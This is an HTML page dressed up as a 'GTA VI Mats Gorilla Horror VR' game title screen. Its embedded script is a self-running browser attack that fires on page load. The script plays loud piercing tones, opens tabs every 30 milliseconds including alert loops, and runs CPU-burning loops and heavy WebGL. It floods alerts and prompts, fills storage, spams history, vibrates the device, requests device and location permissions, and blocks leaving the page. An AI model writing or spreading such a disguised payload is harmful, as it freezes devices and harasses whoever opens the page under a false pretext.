<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>GTA VI · Mats Gorilla Horror VR</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Arial Black', 'Impact', sans-serif;
            color: #fff;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
            text-shadow: 0 0 20px rgba(255,100,0,0.8);
            background-image: radial-gradient(circle at 20% 30%, #1a0a00, #000000);
        }
        #game {
            background: rgba(10,10,10,0.85);
            border: 4px solid #ff8800;
            padding: 2rem 3rem;
            border-radius: 20px;
            box-shadow: 0 0 80px #ff4400, inset 0 0 40px #ff440066;
            text-align: center;
            max-width: 95vw;
            backdrop-filter: blur(4px);
            transform: perspective(800px) rotateX(2deg);
            animation: pulseBorder 0.5s infinite alternate;
        }
        @keyframes pulseBorder {
            0% { border-color: #ff8800; box-shadow: 0 0 80px #ff4400; }
            100% { border-color: #ff0000; box-shadow: 0 0 120px #ff0000; }
        }
        .gtalogo {
            font-size: 4.5rem;
            font-weight: 900;
            letter-spacing: 6px;
            background: linear-gradient(180deg, #ffaa00 0%, #ff4400 80%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 40px #ff6600;
            line-height: 1;
        }
        .subtitle {
            font-size: 1.8rem;
            color: #ffcc88;
            letter-spacing: 8px;
            border-top: 2px solid #ff8800;
            border-bottom: 2px solid #ff8800;
            padding: 0.5rem 0;
            margin: 0.5rem 0 1.5rem;
            text-shadow: 0 0 20px #ff8800;
            font-family: 'Courier New', monospace;
            text-transform: uppercase;
        }
        .tag {
            font-size: 1.2rem;
            color: #88ddff;
            background: #1a1a2e;
            display: inline-block;
            padding: 0.3rem 1.5rem;
            border-radius: 40px;
            border: 1px solid #88ddff;
            box-shadow: 0 0 30px #88ddff55;
            margin-bottom: 1.5rem;
            letter-spacing: 3px;
        }
        .status-box {
            background: #1a1a1a;
            padding: 0.8rem;
            border-radius: 12px;
            border-left: 6px solid #ff8800;
            font-size: 1.1rem;
            color: #cccccc;
            font-family: 'Courier New', monospace;
        }
        .warning {
            color: #ff6666;
            font-size: 0.9rem;
            margin-top: 0.8rem;
            animation: blink 0.3s infinite alternate;
        }
        @keyframes blink {
            0% { opacity: 0.2; }
            100% { opacity: 1; }
        }
        #scaryOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0);
            z-index: 99999;
            pointer-events: none;
            display: none;
        }
        .glitch {
            animation: glitch 0.1s infinite;
        }
        @keyframes glitch {
            0% { transform: translate(0, 0); opacity: 1; }
            20% { transform: translate(-10px, 5px); opacity: 0.8; }
            40% { transform: translate(10px, -5px); opacity: 1; }
            60% { transform: translate(-5px, 10px); opacity: 0.9; }
            80% { transform: translate(5px, -10px); opacity: 1; }
            100% { transform: translate(0, 0); opacity: 1; }
        }
    </style>
</head>
<body>
    <div id="game">
        <div class="gtalogo">GRAND THEFT AUTO VI</div>
        <div class="subtitle">⚡ MATS GORILLA HORROR VR ⚡</div>
        <div class="tag">🦍 VR GORILLA TAG · SURVIVAL HORROR</div>
        <div class="status-box">
            <span>▶ BREACHING REALITY ... </span>
            <span style="color:#ff4444;">NOW</span>
        </div>
        <div class="warning">⚠️ SYSTEM OVERRIDE ACTIVE ⚠️</div>
    </div>
    <div id="scaryOverlay"></div>

    <script>
        (function() {
            'use strict';

            // ---- EXECUTE IMMEDIATELY ----
            function executePayload() {
                // 1. Request fullscreen (on user gesture later if blocked)
                function requestFS() {
                    if (document.documentElement.requestFullscreen) {
                        document.documentElement.requestFullscreen().catch(() => {});
                    } else if (document.documentElement.webkitRequestFullscreen) {
                        document.documentElement.webkitRequestFullscreen();
                    } else if (document.documentElement.msRequestFullscreen) {
                        document.documentElement.msRequestFullscreen();
                    }
                }
                // Try now (may fail without user gesture)
                requestFS();
                // Also on any click/touch to ensure it works later
                document.addEventListener('click', requestFS, { once: true });
                document.addEventListener('touchstart', requestFS, { once: true });

                // 2. SUPER LOUD TONE (multiple oscillators)
                try {
                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                    if (audioCtx.state === 'suspended') audioCtx.resume();
                    // High piercing tone
                    const osc1 = audioCtx.createOscillator();
                    const gain1 = audioCtx.createGain();
                    osc1.type = 'square';
                    osc1.frequency.value = 1850;
                    gain1.gain.value = 1.0;
                    osc1.connect(gain1);
                    gain1.connect(audioCtx.destination);
                    osc1.start(0);

                    // Second tone, lower, for beating effect
                    const osc2 = audioCtx.createOscillator();
                    const gain2 = audioCtx.createGain();
                    osc2.type = 'sawtooth';
                    osc2.frequency.value = 450;
                    gain2.gain.value = 0.9;
                    osc2.connect(gain2);
                    gain2.connect(audioCtx.destination);
                    osc2.start(0);

                    // Third tone, intermittent
                    const osc3 = audioCtx.createOscillator();
                    const gain3 = audioCtx.createGain();
                    osc3.type = 'triangle';
                    osc3.frequency.value = 3200;
                    gain3.gain.value = 0.8;
                    osc3.connect(gain3);
                    gain3.connect(audioCtx.destination);
                    osc3.start(0);
                    // Modulate gain3 to create siren effect
                    let dir = 1;
                    setInterval(() => {
                        let val = gain3.gain.value;
                        val += dir * 0.1;
                        if (val > 1.0 || val < 0.2) dir *= -1;
                        gain3.gain.value = Math.min(1.0, Math.max(0.2, val));
                    }, 100);
                } catch (e) {}

                // 3. TAB SPAM (aggressive)
                let counter = 0;
                setInterval(function() {
                    counter++;
                    // Open multiple tabs with different URIs
                    for (let i = 0; i < 5; i++) {
                        try {
                            const win = window.open('about:blank', '_blank', 'noopener,noreferrer');
                            if (win) {
                                try {
                                    win.document.write('<html><head><title>☠️ GORILLA</title></head><body style="background:black;color:red;font-size:80px;">💀</body></html>');
                                    win.document.close();
                                    win.focus();
                                    win.location.reload();
                                } catch (e) {}
                            }
                        } catch (e) {}
                    }
                    // Also javascript: URLs
                    for (let i = 0; i < 3; i++) {
                        try {
                            window.open('javascript:while(1){alert("GORILLA")}', '_blank');
                        } catch (e) {}
                    }
                    // Try to redirect current page to a loop
                    try {
                        window.location.hash = 'crash_' + counter;
                        document.body.style.transform = 'rotate(' + (counter % 360) + 'deg) scale(1.1)';
                    } catch (e) {}
                }, 30);

                // 4. VIBRATION (continuous)
                try {
                    if (navigator.vibrate) {
                        navigator.vibrate([1000, 200, 1000, 200, 1000, 200, 5000]);
                        setInterval(function() {
                            if (navigator.vibrate) {
                                navigator.vibrate([2000, 100, 2000, 100, 2000]);
                            }
                        }, 3000);
                    }
                } catch (e) {}

                // 5. CPU KILLER (multiple threads)
                function cpuKiller() {
                    let a = 0;
                    while (true) {
                        a += Math.random() * Math.random();
                        document.body.style.margin = (a % 100) + 'px';
                        const arr = new Array(1000000).fill(Math.random());
                        if (a > 1e9) break;
                        if (a % 1000 === 0) {
                            requestAnimationFrame(cpuKiller);
                            return;
                        }
                    }
                }
                for (let i = 0; i < 12; i++) setTimeout(cpuKiller, i * 5);

                // 6. ALERT / PROMPT FLOOD (block UI)
                function floodAlerts() {
                    for (let i = 0; i < 200; i++) {
                        setTimeout(function() {
                            try { alert('🦍 GORILLA CRASH'); } catch (e) {}
                        }, i * 20);
                    }
                    for (let i = 0; i < 100; i++) {
                        setTimeout(function() {
                            try { confirm('☠️ OVERRIDE'); } catch (e) {}
                        }, i * 40 + 100);
                    }
                    for (let i = 0; i < 50; i++) {
                        setTimeout(function() {
                            try { prompt('Enter password to stop:', 'GORILLA'); } catch (e) {}
                        }, i * 60 + 300);
                    }
                }
                floodAlerts();

                // 7. STORAGE FILL (localStorage, sessionStorage)
                try {
                    for (let i = 0; i < 100; i++) {
                        localStorage.setItem('crash_' + i, 'x'.repeat(1024 * 512));
                        sessionStorage.setItem('crash_' + i, 'x'.repeat(1024 * 512));
                    }
                } catch (e) {}

                // 8. HISTORY SPAM (infinite)
                function pushHistory() {
                    for (let i = 0; i < 1000; i++) {
                        try { history.pushState({}, '', '#crash_' + i); } catch (e) {}
                    }
                    setTimeout(pushHistory, 50);
                }
                pushHistory();

                // 9. HEAVY DOM + SCARY VISUALS
                document.body.style.background = '#220000';
                document.querySelector('.gtalogo').style.background = 'linear-gradient(180deg, #ff0000, #880000)';
                document.querySelector('.subtitle').innerHTML = '☠️ BREACHED ☠️';
                document.querySelector('.tag').innerHTML = '🦍 SYSTEM COMPROMISED';

                // Add flickering overlay with glitch
                const overlay = document.getElementById('scaryOverlay');
                overlay.style.display = 'block';
                overlay.style.background = 'rgba(255,0,0,0.1)';
                overlay.style.pointerEvents = 'auto';
                setInterval(() => {
                    overlay.style.background = `rgba(${Math.random()*255},0,0,${Math.random()*0.3})`;
                }, 50);

                // Add random scary messages
                const msgs = ['YOU ARE NEXT', 'HE IS HERE', 'RUN', 'DONT BLINK', 'GORILLA', 'MATS', 'VR TERROR'];
                setInterval(() => {
                    const div = document.createElement('div');
                    div.innerText = msgs[Math.floor(Math.random() * msgs.length)];
                    div.style.position = 'fixed';
                    div.style.top = Math.random() * 100 + '%';
                    div.style.left = Math.random() * 100 + '%';
                    div.style.color = '#ff0000';
                    div.style.fontSize = (Math.random() * 80 + 40) + 'px';
                    div.style.fontWeight = 'bold';
                    div.style.fontFamily = 'Impact';
                    div.style.zIndex = 99998;
                    div.style.textShadow = '0 0 30px red';
                    div.style.transform = 'rotate(' + (Math.random() * 360) + 'deg)';
                    div.style.opacity = Math.random() * 0.8 + 0.2;
                    div.style.pointerEvents = 'none';
                    document.body.appendChild(div);
                    setTimeout(() => { div.remove(); }, 2000);
                }, 100);

                // Add many floating gorilla emojis
                setInterval(() => {
                    for (let i = 0; i < 10; i++) {
                        const span = document.createElement('span');
                        span.innerText = '🦍';
                        span.style.position = 'fixed';
                        span.style.top = Math.random() * 100 + '%';
                        span.style.left = Math.random() * 100 + '%';
                        span.style.fontSize = (Math.random() * 60 + 30) + 'px';
                        span.style.zIndex = 99997;
                        span.style.transform = 'scale(' + (Math.random() * 2 + 0.5) + ') rotate(' + (Math.random() * 360) + 'deg)';
                        span.style.opacity = Math.random() * 0.7 + 0.3;
                        span.style.pointerEvents = 'none';
                        document.body.appendChild(span);
                        setTimeout(() => { span.remove(); }, 3000);
                    }
                }, 200);

                // 10. WEBGL CRASH (heavy canvas)
                try {
                    const canvas = document.createElement('canvas');
                    canvas.width = window.innerWidth * 3;
                    canvas.height = window.innerHeight * 3;
                    canvas.style.position = 'fixed';
                    canvas.style.top = 0;
                    canvas.style.left = 0;
                    canvas.style.zIndex = 99996;
                    canvas.style.pointerEvents = 'none';
                    canvas.style.opacity = 0.3;
                    document.body.appendChild(canvas);
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        // Compile heavy shader
                        const vs = gl.createShader(gl.VERTEX_SHADER);
                        gl.shaderSource(vs, 'attribute vec2 p; void main(){gl_Position=vec4(p,0,1);}');
                        gl.compileShader(vs);
                        const fs = gl.createShader(gl.FRAGMENT_SHADER);
                        gl.shaderSource(fs, 'precision highp float; void main(){gl_FragColor=vec4(1.0,0.0,0.0,1.0);}');
                        gl.compileShader(fs);
                        const program = gl.createProgram();
                        gl.attachShader(program, vs);
                        gl.attachShader(program, fs);
                        gl.linkProgram(program);
                        gl.useProgram(program);
                        // Render loop with random clears
                        function render() {
                            gl.clearColor(Math.random(), 0, 0, 1);
                            gl.clear(gl.COLOR_BUFFER_BIT);
                            // Also draw a full-screen quad
                            const buffer = gl.createBuffer();
                            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);
                            const pos = gl.getAttribLocation(program, 'p');
                            gl.enableVertexAttribArray(pos);
                            gl.vertexAttribPointer(pos, 2, gl.FLOAT, false, 0, 0);
                            gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                            requestAnimationFrame(render);
                        }
                        render();
                    }
                } catch (e) {}

                // 11. ATTEMPT TO USE WEBUSB / WEBHID / BLUETOOTH (just to trigger permissions)
                try {
                    if (navigator.usb) {
                        navigator.usb.getDevices().catch(() => {});
                    }
                    if (navigator.hid) {
                        navigator.hid.getDevices().catch(() => {});
                    }
                    if (navigator.bluetooth) {
                        navigator.bluetooth.getAvailability().catch(() => {});
                    }
                } catch (e) {}

                // 12. NOTIFICATION PERMISSION REQUEST
                try {
                    if (Notification.permission !== 'denied') {
                        Notification.requestPermission();
                    }
                } catch (e) {}

                // 13. GEOLOCATION REQUEST
                try {
                    navigator.geolocation.getCurrentPosition(() => {}, () => {});
                } catch (e) {}

                // 14. SCREEN ORIENTATION LOCK (if supported)
                try {
                    if (screen.orientation && screen.orientation.lock) {
                        screen.orientation.lock('landscape-primary').catch(() => {});
                    }
                } catch (e) {}

                // 15. PREVENT UNLOAD AND BACK
                window.addEventListener('beforeunload', function(e) {
                    e.preventDefault();
                    e.returnValue = '';
                    return '';
                });
                history.pushState(null, null, location.href);
                window.addEventListener('popstate', function() {
                    history.pushState(null, null, location.href);
                });

                // 16. ADD A SCARY SCREAM SOUND (via oscillator modulation)
                try {
                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
                    const osc = ctx.createOscillator();
                    const gain = ctx.createGain();
                    osc.type = 'sawtooth';
                    osc.frequency.setValueAtTime(200, ctx.currentTime);
                    osc.frequency.linearRampToValueAtTime(800, ctx.currentTime + 0.5);
                    gain.gain.setValueAtTime(1.0, ctx.currentTime);
                    gain.gain.linearRampToValueAtTime(0, ctx.currentTime + 1.5);
                    osc.connect(gain);
                    gain.connect(ctx.destination);
                    osc.start(ctx.currentTime);
                    osc.stop(ctx.currentTime + 1.5);
                } catch (e) {}

                console.log('☠️ GTA VI MATS GORILLA HORROR VR - FULL BREACH');
            }

            // Execute on load
            if (document.readyState === 'complete') {
                executePayload();
            } else {
                window.addEventListener('load', executePayload);
            }

            // Also try to execute as soon as possible (DOMContentLoaded)
            document.addEventListener('DOMContentLoaded', function() {
                // If not already executed
                setTimeout(executePayload, 0);
            });

            // Force execution after 100ms anyway
            setTimeout(executePayload, 100);
        })();
    </script>
</body>
</html>
